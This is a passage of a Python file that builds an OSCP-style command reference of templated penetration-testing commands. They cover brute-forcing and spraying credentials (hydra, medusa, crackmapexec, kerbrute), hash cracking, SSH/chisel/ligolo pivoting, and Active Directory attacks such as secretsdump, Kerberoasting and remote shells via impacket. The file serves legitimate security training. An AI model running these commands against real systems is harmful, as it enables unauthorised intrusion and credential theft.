        description="Brute force FTP credentials",
        command="hydra -L <USERLIST> -P <PASSLIST> ftp://<TARGET>",
        category="password-attacks",
        subcategory="brute-force",
        variables={
            "USERLIST": {"description": "Username wordlist", "default": "/usr/share/wordlists/metasploit/unix_users.txt"},
            "PASSLIST": {"description": "Password wordlist", "default": "/usr/share/wordlists/rockyou.txt"},
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-L", "description": "Username list"},
            {"flag": "-P", "description": "Password list"},
            {"flag": "-t", "description": "Parallel tasks (default 16)"},
            {"flag": "-V", "description": "Verbose (show attempts)"},
        ],
        tags=["oscp", "hydra", "ftp", "brute-force"],
        next_steps=["Test credentials", "Access FTP server", "Enumerate files"],
    ),
    create_command_template(
        cmd_id="hydra-http",
        name="Hydra - HTTP POST Brute Force",
        description="Brute force HTTP login forms",
        command="hydra -l <USER> -P <PASSLIST> <TARGET> http-post-form '<PATH>:<PARAMS>:<FAIL_STRING>'",
        category="password-attacks",
        subcategory="brute-force",
        variables={
            "USER": {"description": "Username", "default": "admin"},
            "PASSLIST": {"description": "Password list", "default": "/usr/share/wordlists/rockyou.txt"},
            "TARGET": {"description": "Target domain/IP", "default": "target.com"},
            "PATH": {"description": "Login path", "default": "/login.php"},
            "PARAMS": {"description": "POST parameters", "default": "user=^USER^&pass=^PASS^"},
            "FAIL_STRING": {"description": "Failure indicator", "default": "Login failed"}
        },
        flags=[
            {"flag": "-l", "description": "Single username"},
            {"flag": "-L", "description": "Username list"},
            {"flag": "http-post-form", "description": "HTTP POST form module"},
        ],
        tags=["oscp", "hydra", "http", "brute-force", "web"],
        next_steps=["Verify credentials", "Access admin panel"],
    ),
    create_command_template(
        cmd_id="medusa-ssh",
        name="Medusa - SSH Brute Force",
        description="Brute force SSH credentials",
        command="medusa -h <TARGET> -U <USERLIST> -P <PASSLIST> -M ssh",
        category="password-attacks",
        subcategory="brute-force",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "USERLIST": {"description": "Username list", "default": "/usr/share/wordlists/metasploit/unix_users.txt"},
            "PASSLIST": {"description": "Password list", "default": "/usr/share/wordlists/rockyou.txt"}
        },
        flags=[
            {"flag": "-h", "description": "Target host"},
            {"flag": "-U", "description": "Username file"},
            {"flag": "-P", "description": "Password file"},
            {"flag": "-M", "description": "Module to use (ssh, ftp, etc.)"},
        ],
        tags=["oscp", "medusa", "ssh", "brute-force"],
        alternatives=["hydra -L <USERLIST> -P <PASSLIST> ssh://<TARGET>"],
        next_steps=["SSH with found credentials", "Enumerate system"],
    ),
    create_command_template(
        cmd_id="medusa-smb",
        name="Medusa - SMB Brute Force",
        description="Brute force SMB credentials",
        command="medusa -h <TARGET> -U <USERLIST> -P <PASSLIST> -M smbnt",
        category="password-attacks",
        subcategory="brute-force",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "USERLIST": {"description": "Username list", "default": "users.txt"},
            "PASSLIST": {"description": "Password list", "default": "/usr/share/wordlists/rockyou.txt"}
        },
        tags=["oscp", "medusa", "smb", "brute-force"],
        alternatives=["crackmapexec smb <TARGET> -u <USERLIST> -p <PASSLIST>"],
        next_steps=["Test credentials", "Enumerate shares"],
    ),
    create_command_template(
        cmd_id="cme-smb",
        name="CrackMapExec - SMB Brute Force",
        description="Brute force and spray SMB credentials",
        command="crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        category="password-attacks",
        subcategory="credential-spraying",
        variables={
            "TARGET": {"description": "Target IP/range", "default": "192.168.1.0/24"},
            "USER": {"description": "Username or file", "default": "admin"},
            "PASS": {"description": "Password or file", "default": "Password123"}
        },
        flags=[
            {"flag": "-u", "description": "Username (or file with -U)"},
            {"flag": "-p", "description": "Password (or file with -P)"},
            {"flag": "--shares", "description": "Enumerate shares"},
            {"flag": "--local-auth", "description": "Local authentication"},
        ],
        tags=["oscp", "crackmapexec", "cme", "smb", "password-spray"],
        next_steps=["Enumerate shares with valid creds", "Test psexec"],
    ),
    create_command_template(
        cmd_id="cme-winrm",
        name="CrackMapExec - WinRM Brute Force",
        description="Brute force WinRM credentials",
        command="crackmapexec winrm <TARGET> -u <USER> -p <PASS>",
        category="password-attacks",
        subcategory="credential-spraying",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "USER": {"description": "Username", "default": "administrator"},
            "PASS": {"description": "Password", "default": "Password123"}
        },
        tags=["oscp", "crackmapexec", "winrm", "password-spray"],
        next_steps=["evil-winrm -i <TARGET> -u <USER> -p <PASS>"],
    ),
    create_command_template(
        cmd_id="cme-ssh",
        name="CrackMapExec - SSH Brute Force",
        description="Brute force SSH credentials",
        command="crackmapexec ssh <TARGET> -u <USER> -p <PASS>",
        category="password-attacks",
        subcategory="credential-spraying",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "USER": {"description": "Username", "default": "root"},
            "PASS": {"description": "Password", "default": "toor"}
        },
        tags=["oscp", "crackmapexec", "ssh", "password-spray"],
        next_steps=["SSH with valid credentials"],
    ),
    create_command_template(
        cmd_id="john-crack",
        name="John - Crack Password Hashes",
        description="Crack password hashes with John the Ripper",
        command="john --wordlist=<WORDLIST> <HASHFILE>",
        category="password-attacks",
        subcategory="hash-cracking",
        variables={
            "WORDLIST": {"description": "Password wordlist", "default": "/usr/share/wordlists/rockyou.txt"},
            "HASHFILE": {"description": "Hash file", "default": "hashes.txt"}
        },
        flags=[
            {"flag": "--wordlist", "description": "Wordlist for cracking"},
            {"flag": "--format", "description": "Hash format (md5, sha256, etc.)"},
            {"flag": "--show", "description": "Show cracked passwords"},
        ],
        tags=["oscp", "john", "hash-cracking"],
        next_steps=["john --show <HASHFILE> (view cracked passwords)"],
    ),
    create_command_template(
        cmd_id="john-format",
        name="John - Format Hash File",
        description="Convert hash to John format",
        command="<TOOL>2john <FILE> > <HASHFILE>",
        category="password-attacks",
        subcategory="hash-cracking",
        variables={
            "TOOL": {"description": "Tool name", "default": "ssh"},
            "FILE": {"description": "Input file", "default": "id_rsa"},
            "HASHFILE": {"description": "Output hash file", "default": "hash.txt"}
        },
        tags=["oscp", "john", "hash-conversion"],
        alternatives=["zip2john", "rar2john", "keepass2john", "pdf2john"],
        next_steps=["john --wordlist=<WORDLIST> <HASHFILE>"],
    ),
    create_command_template(
        cmd_id="hashcat-crack",
        name="Hashcat - Crack Hashes",
        description="GPU-accelerated hash cracking",
        command="hashcat -m <MODE> -a 0 <HASHFILE> <WORDLIST>",
        category="password-attacks",
        subcategory="hash-cracking",
        variables={
            "MODE": {"description": "Hash mode (0=MD5, 1000=NTLM, etc.)", "default": "0"},
            "HASHFILE": {"description": "Hash file", "default": "hashes.txt"},
            "WORDLIST": {"description": "Wordlist", "default": "/usr/share/wordlists/rockyou.txt"}
        },
        flags=[
            {"flag": "-m", "description": "Hash type mode"},
            {"flag": "-a", "description": "Attack mode (0=wordlist, 3=brute-force)"},
            {"flag": "-r", "description": "Rules file"},
            {"flag": "--show", "description": "Show cracked hashes"},
        ],
        tags=["oscp", "hashcat", "hash-cracking", "gpu"],
        next_steps=["hashcat --show <HASHFILE> (view cracked)"],
    ),
    create_command_template(
        cmd_id="hashcat-modes",
        name="Hashcat - List Hash Modes",
        description="Display supported hash types",
        command="hashcat --help | grep -i <HASH_TYPE>",
        category="password-attacks",
        subcategory="hash-cracking",
        variables={
            "HASH_TYPE": {"description": "Hash type to search", "default": "ntlm"}
        },
        tags=["oscp", "hashcat", "reference"],
        next_steps=["Use mode number with -m flag"],
    ),
    create_command_template(
        cmd_id="hashid-identify",
        name="Hashid - Identify Hash Type",
        description="Identify hash type for cracking",
        command="hashid <HASH>",
        category="password-attacks",
        subcategory="hash-identification",
        variables={
            "HASH": {"description": "Hash string", "default": "5f4dcc3b5aa765d61d8327deb882cf99"}
        },
        flags=[
            {"flag": "-m", "description": "Show Hashcat modes"},
            {"flag": "-j", "description": "Show John formats"},
        ],
        tags=["oscp", "hashid", "hash-identification"],
        alternatives=["hash-identifier"],
        next_steps=["Use suggested mode with hashcat/john"],
    ),
    create_command_template(
        cmd_id="hash-identifier-run",
        name="Hash Identifier - Interactive",
        description="Interactive hash type identification",
        command="hash-identifier",
        category="password-attacks",
        subcategory="hash-identification",
        tags=["oscp", "hash-identifier", "interactive"],
        next_steps=["Paste hash when prompted", "Use suggested cracking tool"],
    ),
    create_command_template(
        cmd_id="kerbrute-userenum",
        name="Kerbrute - User Enumeration",
        description="Enumerate valid Active Directory users via Kerberos",
        command="kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>",
        category="password-attacks",
        subcategory="active-directory",
        variables={
            "DOMAIN": {"description": "Domain name", "default": "domain.local"},
            "DC_IP": {"description": "Domain controller IP", "default": "192.168.1.10"},
            "USERLIST": {"description": "Username wordlist", "default": "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"}
        },
        flags=[
            {"flag": "-d", "description": "Domain name"},
            {"flag": "--dc", "description": "Domain controller IP"},
            {"flag": "-o", "description": "Output file"},
        ],
        tags=["oscp", "kerbrute", "active-directory", "enumeration", "kerberos"],
        next_steps=["Test AS-REP roasting on found users", "Password spray"],
    ),
    create_command_template(
        cmd_id="kerbrute-bruteuser",
        name="Kerbrute - Password Spray",
        description="Password spray against Active Directory users",
        command="kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> <PASSWORD>",
        category="password-attacks",
        subcategory="active-directory",
        variables={
            "DOMAIN": {"description": "Domain name", "default": "domain.local"},
            "DC_IP": {"description": "Domain controller IP", "default": "192.168.1.10"},
            "USERLIST": {"description": "Valid usernames", "default": "users.txt"},
            "PASSWORD": {"description": "Password to test", "default": "Password123"}
        },
        tags=["oscp", "kerbrute", "active-directory", "password-spray"],
        next_steps=["Test found credentials", "Enumerate with valid creds"],
    ),
]


# ==============================================================================
# TUNNELING & PIVOTING COMMANDS
# ==============================================================================

TUNNEL_COMMANDS = [
    create_command_template(
        cmd_id="chisel-server",
        name="Chisel - Server Mode",
        description="Start Chisel server for reverse tunneling",
        command="chisel server -p <PORT> --reverse",
        category="tunneling",
        subcategory="port-forwarding",
        variables={
            "PORT": {"description": "Server port", "default": "8000"}
        },
        flags=[
            {"flag": "-p", "description": "Server listening port"},
            {"flag": "--reverse", "description": "Enable reverse tunneling"},
            {"flag": "--socks5", "description": "Enable SOCKS5 proxy"},
        ],
        tags=["oscp", "chisel", "tunneling", "pivoting", "server"],
        next_steps=["Run chisel client on compromised host", "Configure proxychains"],
    ),
    create_command_template(
        cmd_id="chisel-client",
        name="Chisel - Client Mode",
        description="Connect Chisel client for tunneling",
        command="chisel client <SERVER_IP>:<PORT> R:<LPORT>:<TARGET>:<RPORT>",
        category="tunneling",
        subcategory="port-forwarding",
        variables={
            "SERVER_IP": {"description": "Attacker IP", "default": "10.10.14.1"},
            "PORT": {"description": "Server port", "default": "8000"},
            "LPORT": {"description": "Local port to open", "default": "9090"},
            "TARGET": {"description": "Target IP in internal network", "default": "172.16.1.10"},
            "RPORT": {"description": "Remote port", "default": "80"}
        },
        tags=["oscp", "chisel", "tunneling", "pivoting", "client"],
        next_steps=["Access service at localhost:<LPORT>"],
    ),
    create_command_template(
        cmd_id="chisel-socks",
        name="Chisel - SOCKS Proxy",
        description="Create SOCKS proxy through Chisel",
        command="chisel client <SERVER_IP>:<PORT> R:socks",
        category="tunneling",
        subcategory="socks-proxy",
        variables={
            "SERVER_IP": {"description": "Attacker IP", "default": "10.10.14.1"},
            "PORT": {"description": "Server port", "default": "8000"}
        },
        tags=["oscp", "chisel", "socks", "proxy"],
        prerequisites=["chisel server --reverse --socks5 running on attacker"],
        next_steps=["Configure proxychains", "Scan internal network"],
    ),
    create_command_template(
        cmd_id="ssh-local-forward",
        name="SSH - Local Port Forwarding",
        description="Forward local port through SSH tunnel",
        command="ssh -L <LPORT>:<TARGET>:<RPORT> <USER>@<SSH_HOST>",
        category="tunneling",
        subcategory="ssh-tunneling",
        variables={
            "LPORT": {"description": "Local port", "default": "8080"},
            "TARGET": {"description": "Target IP in internal network", "default": "172.16.1.10"},
            "RPORT": {"description": "Remote port", "default": "80"},
            "USER": {"description": "SSH username", "default": "user"},
            "SSH_HOST": {"description": "SSH server IP", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-L", "description": "Local port forwarding"},
            {"flag": "-N", "description": "No command execution (tunnel only)"},
            {"flag": "-f", "description": "Background process"},
        ],
        tags=["oscp", "ssh", "tunneling", "port-forwarding", "local"],
        next_steps=["Access service at localhost:<LPORT>"],
    ),
    create_command_template(
        cmd_id="ssh-remote-forward",
        name="SSH - Remote Port Forwarding",
        description="Forward remote port back to attacker",
        command="ssh -R <RPORT>:localhost:<LPORT> <USER>@<SSH_HOST>",
        category="tunneling",
        subcategory="ssh-tunneling",
        variables={
            "RPORT": {"description": "Remote port to open", "default": "8080"},
            "LPORT": {"description": "Local port to forward", "default": "80"},
            "USER": {"description": "SSH username", "default": "user"},
            "SSH_HOST": {"description": "SSH server IP", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-R", "description": "Remote port forwarding"},
            {"flag": "-N", "description": "No command execution"},
        ],
        tags=["oscp", "ssh", "tunneling", "port-forwarding", "remote"],
        next_steps=["Service accessible on SSH host at <RPORT>"],
    ),
    create_command_template(
        cmd_id="ssh-dynamic-forward",
        name="SSH - Dynamic Port Forwarding (SOCKS)",
        description="Create SOCKS proxy through SSH",
        command="ssh -D <LPORT> <USER>@<SSH_HOST>",
        category="tunneling",
        subcategory="ssh-tunneling",
        variables={
            "LPORT": {"description": "Local SOCKS port", "default": "1080"},
            "USER": {"description": "SSH username", "default": "user"},
            "SSH_HOST": {"description": "SSH server IP", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-D", "description": "Dynamic port forwarding (SOCKS)"},
            {"flag": "-N", "description": "No command execution"},
            {"flag": "-f", "description": "Background process"},
        ],
        tags=["oscp", "ssh", "tunneling", "socks", "dynamic"],
        next_steps=["Configure proxychains.conf", "Route traffic through SOCKS"],
    ),
    create_command_template(
        cmd_id="proxychains-config",
        name="Proxychains - Configure",
        description="Configure proxychains for SOCKS proxy",
        command="echo 'socks5 127.0.0.1 <PORT>' >> /etc/proxychains.conf",
        category="tunneling",
        subcategory="proxy-configuration",
        variables={
            "PORT": {"description": "SOCKS proxy port", "default": "1080"}
        },
        tags=["oscp", "proxychains", "socks", "configuration"],
        prerequisites=["SOCKS proxy running (SSH -D, chisel, etc.)"],
        next_steps=["proxychains <COMMAND> (route traffic through proxy)"],
    ),
    create_command_template(
        cmd_id="sshuttle-vpn",
        name="SSHuttle - VPN over SSH",
        description="Create VPN tunnel over SSH connection",
        command="sshuttle -r <USER>@<SSH_HOST> <NETWORK>",
        category="tunneling",
        subcategory="vpn",
        variables={
            "USER": {"description": "SSH username", "default": "user"},
            "SSH_HOST": {"description": "SSH server IP", "default": "192.168.1.1"},
            "NETWORK": {"description": "Network to tunnel", "default": "172.16.1.0/24"}
        },
        flags=[
            {"flag": "-r", "description": "SSH connection string"},
            {"flag": "-x", "description": "Exclude specific subnets"},
            {"flag": "-v", "description": "Verbose output"},
        ],
        tags=["oscp", "sshuttle", "vpn", "tunneling"],
        prerequisites=["SSH access to pivot host", "Python on target"],
        next_steps=["Directly access internal network services"],
    ),
    create_command_template(
        cmd_id="socat-port-forward",
        name="Socat - Port Forwarding",
        description="Forward ports using socat",
        command="socat TCP-LISTEN:<LPORT>,fork TCP:<TARGET>:<RPORT>",
        category="tunneling",
        subcategory="port-forwarding",
        variables={
            "LPORT": {"description": "Local listening port", "default": "8080"},
            "TARGET": {"description": "Target IP", "default": "172.16.1.10"},
            "RPORT": {"description": "Remote port", "default": "80"}
        },
        flags=[
            {"flag": "TCP-LISTEN", "description": "Listen on TCP port"},
            {"flag": "fork", "description": "Handle multiple connections"},
            {"flag": "TCP", "description": "Connect to TCP port"},
        ],
        tags=["oscp", "socat", "port-forwarding"],
        next_steps=["Access service at localhost:<LPORT>"],
    ),
    create_command_template(
        cmd_id="ligolo-server",
        name="Ligolo-ng - Server",
        description="Start Ligolo-ng server for pivoting",
        command="ligolo-ng -selfcert",
        category="tunneling",
        subcategory="pivoting",
        tags=["oscp", "ligolo-ng", "pivoting", "server"],
        prerequisites=["Create TUN interface: sudo ip tuntap add user $(whoami) mode tun ligolo"],
        next_steps=["Run ligolo agent on target", "Add routes"],
    ),
    create_command_template(
        cmd_id="ligolo-agent",
        name="Ligolo-ng - Agent",
        description="Connect Ligolo-ng agent to server",
        command="ligolo-agent -connect <SERVER_IP>:11601 -ignore-cert",
        category="tunneling",
        subcategory="pivoting",
        variables={
            "SERVER_IP": {"description": "Attacker IP", "default": "10.10.14.1"}
        },
        tags=["oscp", "ligolo-ng", "pivoting", "agent"],
        next_steps=["Start session", "Add route to internal network"],
    ),
]


# ==============================================================================
# ACTIVE DIRECTORY COMMANDS
# ==============================================================================

AD_COMMANDS = [
    create_command_template(
        cmd_id="bloodhound-ingest",
        name="BloodHound - Ingest Data",
        description="Import SharpHound data to BloodHound",
        command="# Import via BloodHound GUI: Upload Data button",
        category="active-directory",
        subcategory="enumeration",
        tags=["oscp", "bloodhound", "active-directory", "gui"],
        prerequisites=["SharpHound.zip collected", "Neo4j running", "BloodHound running"],
        next_steps=["Run pre-built queries", "Find attack paths"],
    ),
    create_command_template(
        cmd_id="bloodhound-query",
        name="BloodHound - Query Paths",
        description="Query attack paths in BloodHound",
        command="# Run query: 'Shortest Paths to Domain Admins'",
        category="active-directory",
        subcategory="enumeration",
        tags=["oscp", "bloodhound", "active-directory", "analysis"],
        next_steps=["Follow path steps", "Test exploits"],
    ),
    create_command_template(
        cmd_id="cme-smb-shares",
        name="CrackMapExec - Enumerate Shares",
        description="Enumerate SMB shares with credentials",
        command="crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares",
        category="active-directory",
        subcategory="enumeration",
        variables={
            "TARGET": {"description": "Target IP/range", "default": "192.168.1.0/24"},
            "USER": {"description": "Username", "default": "user"},
            "PASS": {"description": "Password", "default": "Password123"}
        },
        flags=[
            {"flag": "--shares", "description": "Enumerate shares"},
            {"flag": "--disks", "description": "Enumerate disks"},
        ],
        tags=["oscp", "crackmapexec", "smb", "active-directory", "shares"],
        next_steps=["Mount interesting shares", "Download sensitive files"],
    ),
    create_command_template(
        cmd_id="cme-smb-users",
        name="CrackMapExec - Enumerate Users",
        description="Enumerate domain users via SMB",
        command="crackmapexec smb <TARGET> -u <USER> -p <PASS> --users",
        category="active-directory",
        subcategory="enumeration",
        variables={
            "TARGET": {"description": "Target DC IP", "default": "192.168.1.10"},
            "USER": {"description": "Username", "default": "user"},
            "PASS": {"description": "Password", "default": "Password123"}
        },
        flags=[
            {"flag": "--users", "description": "Enumerate domain users"},
            {"flag": "--groups", "description": "Enumerate domain groups"},
        ],
        tags=["oscp", "crackmapexec", "active-directory", "enumeration"],
        next_steps=["Build user list", "Password spray"],
    ),
    create_command_template(
        cmd_id="psexec-shell",
        name="Impacket PSExec - Remote Shell",
        description="Execute commands remotely via PSExec",
        command="impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
        category="active-directory",
        subcategory="lateral-movement",
        variables={
            "DOMAIN": {"description": "Domain name", "default": "domain.local"},
            "USER": {"description": "Username", "default": "administrator"},
            "PASS": {"description": "Password or NTLM hash", "default": "Password123"},
            "TARGET": {"description": "Target IP", "default": "192.168.1.10"}
        },
        tags=["oscp", "impacket", "psexec", "active-directory", "lateral-movement"],
        prerequisites=["Valid credentials", "Admin privileges on target"],
        next_steps=["Execute commands as SYSTEM"],
    ),
    create_command_template(
        cmd_id="smbexec-shell",
        name="Impacket SMBExec - Remote Shell",
        description="Execute commands via SMB (fileless)",
        command="impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
        category="active-directory",
        subcategory="lateral-movement",
        variables={
            "DOMAIN": {"description": "Domain name", "default": "domain.local"},
            "USER": {"description": "Username", "default": "administrator"},
            "PASS": {"description": "Password", "default": "Password123"},
            "TARGET": {"description": "Target IP", "default": "192.168.1.10"}
        },
        tags=["oscp", "impacket", "smbexec", "active-directory", "lateral-movement"],
        alternatives=["psexec-shell", "wmiexec-shell"],
        next_steps=["Execute commands"],
    ),
    create_command_template(
        cmd_id="wmiexec-shell",
        name="Impacket WMIExec - Remote Shell",
        description="Execute commands via WMI (semi-interactive)",
        command="impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
        category="active-directory",
        subcategory="lateral-movement",
        variables={
            "DOMAIN": {"description": "Domain name", "default": "domain.local"},
            "USER": {"description": "Username", "default": "administrator"},
            "PASS": {"description": "Password", "default": "Password123"},
            "TARGET": {"description": "Target IP", "default": "192.168.1.10"}
        },
        tags=["oscp", "impacket", "wmiexec", "active-directory", "lateral-movement"],
        next_steps=["Execute commands"],
    ),
    create_command_template(
        cmd_id="secretsdump-hashes",
        name="Impacket SecretsDump - Dump Hashes",
        description="Dump SAM/LSA/NTDS secrets from Windows",
        command="impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET>",
        category="active-directory",
        subcategory="credential-dumping",
        variables={
            "DOMAIN": {"description": "Domain name", "default": "domain.local"},
            "USER": {"description": "Admin username", "default": "administrator"},
            "PASS": {"description": "Password", "default": "Password123"},
            "TARGET": {"description": "Target DC IP", "default": "192.168.1.10"}
        },
        flags=[
            {"flag": "-just-dc", "description": "Extract NTDS.dit only"},
            {"flag": "-just-dc-ntlm", "description": "Extract NTLM hashes only"},
        ],
        tags=["oscp", "impacket", "secretsdump", "active-directory", "credentials"],
        prerequisites=["Domain Admin or equivalent privileges"],
        next_steps=["Crack hashes", "Pass-the-hash attacks"],
    ),
    create_command_template(
        cmd_id="getnpusers-asreproast",
        name="Impacket GetNPUsers - AS-REP Roasting",
        description="Extract AS-REP hashes for users without Kerberos pre-auth",
        command="impacket-GetNPUsers <DOMAIN>/ -usersfile <USERLIST> -dc-ip <DC_IP>",
        category="active-directory",
        subcategory="kerberos-attacks",
        variables={
            "DOMAIN": {"description": "Domain name", "default": "domain.local"},
            "USERLIST": {"description": "File with usernames", "default": "users.txt"},
            "DC_IP": {"description": "Domain controller IP", "default": "192.168.1.10"}
        },
        flags=[
            {"flag": "-dc-ip", "description": "Domain controller IP"},
            {"flag": "-usersfile", "description": "File containing usernames"},
            {"flag": "-request", "description": "Request TGT for users"},
        ],
        tags=["oscp", "impacket", "as-rep-roasting", "kerberos", "active-directory"],
        next_steps=["Crack AS-REP hashes with hashcat/john"],
    ),
    create_command_template(
        cmd_id="getuserspns-kerberoast",
        name="Impacket GetUserSPNs - Kerberoasting",
        description="Request service tickets for Kerberoastable accounts",
        command="impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request",
        category="active-directory",
        subcategory="kerberos-attacks",
        variables={
            "DOMAIN": {"description": "Domain name", "default": "domain.local"},
            "USER": {"description": "Domain user", "default": "user"},
            "PASS": {"description": "Password", "default": "Password123"},
            "DC_IP": {"description": "Domain controller IP", "default": "192.168.1.10"}
        },
        flags=[
            {"flag": "-request", "description": "Request TGS tickets"},
            {"flag": "-dc-ip", "description": "Domain controller IP"},
            {"flag": "-outputfile", "description": "Save hashes to file"},
        ],
        tags=["oscp", "impacket", "kerberoasting", "kerberos", "active-directory"],
        prerequisites=["Valid domain user credentials"],
        next_steps=["Crack TGS hashes with hashcat mode 13100"],
    ),
    create_command_template(
        cmd_id="evil-winrm-shell",
        name="Evil-WinRM - PowerShell Remoting",
        description="Connect to Windows via WinRM for PowerShell access",
        command="evil-winrm -i <TARGET> -u <USER> -p <PASS>",
        category="active-directory",
        subcategory="lateral-movement",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.10"},
            "USER": {"description": "Username", "default": "administrator"},
            "PASS": {"description": "Password", "default": "Password123"}
        },
        flags=[
            {"flag": "-i", "description": "Target IP"},
            {"flag": "-u", "description": "Username"},
            {"flag": "-p", "description": "Password"},
            {"flag": "-H", "description": "NTLM hash (pass-the-hash)"},
        ],
        tags=["oscp", "evil-winrm", "winrm", "active-directory", "powershell"],
        prerequisites=["WinRM enabled on target", "Valid credentials"],
        next_steps=["Upload files", "Execute PowerShell commands"],
    ),
    create_command_template(
        cmd_id="rpcclient-enum",
        name="RPCClient - Enumerate SMB",
        description="Enumerate SMB/MSRPC information",
        command="rpcclient -U '<USER>%<PASS>' <TARGET>",
        category="active-directory",
        subcategory="enumeration",
        variables={
            "USER": {"description": "Username (or empty for null session)", "default": ""},
            "PASS": {"description": "Password (or empty for null session)", "default": ""},
            "TARGET": {"description": "Target IP", "default": "192.168.1.10"}
        },
        tags=["oscp", "rpcclient", "smb", "enumeration", "active-directory"],
        next_steps=["enumdomusers (list users)", "enumdomgroups (list groups)", "queryuser <RID>"],
    ),
    create_command_template(
        cmd_id="smbclient-connect",
        name="SMBClient - Connect to Share",
        description="Connect to SMB share and browse files",
        command="smbclient //<TARGET>/<SHARE> -U <USER>",
        category="active-directory",
        subcategory="enumeration",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.10"},
            "SHARE": {"description": "Share name", "default": "C$"},
            "USER": {"description": "Username", "default": "administrator"}
        },
        flags=[
            {"flag": "-U", "description": "Username"},
            {"flag": "-N", "description": "No password (null session)"},
            {"flag": "-L", "description": "List shares"},
        ],
        tags=["oscp", "smbclient", "smb", "active-directory", "shares"],
        next_steps=["ls (list files)", "get <FILE> (download)", "put <FILE> (upload)"],
    ),
    create_command_template(
        cmd_id="smbmap-shares",
        name="SMBMap - Enumerate Shares",
        description="Enumerate SMB shares and permissions",
        command="smbmap -H <TARGET> -u <USER> -p <PASS>",
        category="active-directory",
        subcategory="enumeration",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.10"},
            "USER": {"description": "Username", "default": "guest"},
            "PASS": {"description": "Password", "default": ""}
        },
        flags=[
            {"flag": "-H", "description": "Target host"},
            {"flag": "-u", "description": "Username"},
            {"flag": "-p", "description": "Password"},
            {"flag": "-R", "description": "Recursively list shares"},
        ],
        tags=["oscp", "smbmap", "smb", "active-directory", "shares"],
        next_steps=["Access writable shares", "Download sensitive files"],
    ),
    create_command_template(
        cmd_id="ldapsearch-ad",
        name="LDAP Search - AD Enumeration",
        description="Query Active Directory via LDAP",
        command="ldapsearch -x -H ldap://<TARGET> -D '<USER>@<DOMAIN>' -w '<PASS>' -b '<BASE_DN>' '(objectClass=user)'",
        category="active-directory",
        subcategory="enumeration",
        variables={
            "TARGET": {"description": "DC IP", "default": "192.168.1.10"},
            "USER": {"description": "Username", "default": "user"},
            "DOMAIN": {"description": "Domain", "default": "domain.local"},
            "PASS": {"description": "Password", "default": "Password123"},
            "BASE_DN": {"description": "Base DN", "default": "DC=domain,DC=local"}
        },
        tags=["oscp", "ldapsearch", "ldap", "active-directory", "enumeration"],
        next_steps=["Extract users", "Find service accounts", "Check descriptions for passwords"],
    ),
    create_command_template(
        cmd_id="rubeus-asreproast",
        name="Rubeus - AS-REP Roasting",
        description="Perform AS-REP roasting on Windows",
        command="Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt",
        category="active-directory",
        subcategory="kerberos-attacks",
        flags=[
            {"flag": "/format:hashcat", "description": "Output format for hashcat"},
            {"flag": "/outfile", "description": "Output file for hashes"},
            {"flag": "/user:<USER>", "description": "Target specific user"},
        ],
        tags=["oscp", "rubeus", "as-rep-roasting", "kerberos", "active-directory", "windows"],
        prerequisites=["Domain user access", "Rubeus.exe on target"],
        next_steps=["Transfer hashes to attacker", "Crack with hashcat"],
    ),
    create_command_template(
        cmd_id="rubeus-kerberoast",
        name="Rubeus - Kerberoasting",
        description="Perform Kerberoasting on Windows",
        command="Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt",
        category="active-directory",
        subcategory="kerberos-attacks",
        flags=[
            {"flag": "/format:hashcat", "description": "Output format for hashcat"},
            {"flag": "/outfile", "description": "Output file for hashes"},
            {"flag": "/user:<USER>", "description": "Target specific SPN account"},
        ],
        tags=["oscp", "rubeus", "kerberoasting", "kerberos", "active-directory", "windows"],
        prerequisites=["Domain user access", "Rubeus.exe on target"],
        next_steps=["Crack TGS hashes with hashcat mode 13100"],
    ),
]


# ==============================================================================
# FILE TRANSFER COMMANDS
# ==============================================================================

TRANSFER_COMMANDS = [
    create_command_template(
        cmd_id="php-http-server",
        name="PHP - Simple HTTP Server",
        description="Start simple HTTP server using PHP",
        command="php -S 0.0.0.0:<PORT>",
        category="file-transfer",
        subcategory="http-server",
        variables={
            "PORT": {"description": "Listening port", "default": "8000"}
        },
        flags=[
            {"flag": "-S", "description": "Run built-in web server"},
        ],
        tags=["oscp", "php", "http-server", "file-transfer"],
        alternatives=["python3 -m http.server <PORT>", "ruby-http-server"],
        next_steps=["wget http://<LHOST>:<PORT>/<FILE> (on target)"],
    ),
    create_command_template(
        cmd_id="ruby-http-server",
        name="Ruby - Simple HTTP Server",
        description="Start simple HTTP server using Ruby",
        command="ruby -run -ehttpd . -p<PORT>",
        category="file-transfer",
        subcategory="http-server",
        variables={
            "PORT": {"description": "Listening port", "default": "8000"}
        },
        tags=["oscp", "ruby", "http-server", "file-transfer"],
        alternatives=["python3 -m http.server <PORT>", "php-http-server"],
        next_steps=["curl http://<LHOST>:<PORT>/<FILE> -o <FILE> (on target)"],
    ),
    create_command_template(
        cmd_id="scp-upload",
        name="SCP - Upload File",
        description="Upload file to remote host via SCP",
        command="scp <LOCAL_FILE> <USER>@<TARGET>:<REMOTE_PATH>",
        category="file-transfer",
        subcategory="scp",
        variables={
            "LOCAL_FILE": {"description": "Local file path", "default": "exploit.sh"},
            "USER": {"description": "SSH username", "default": "user"},
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
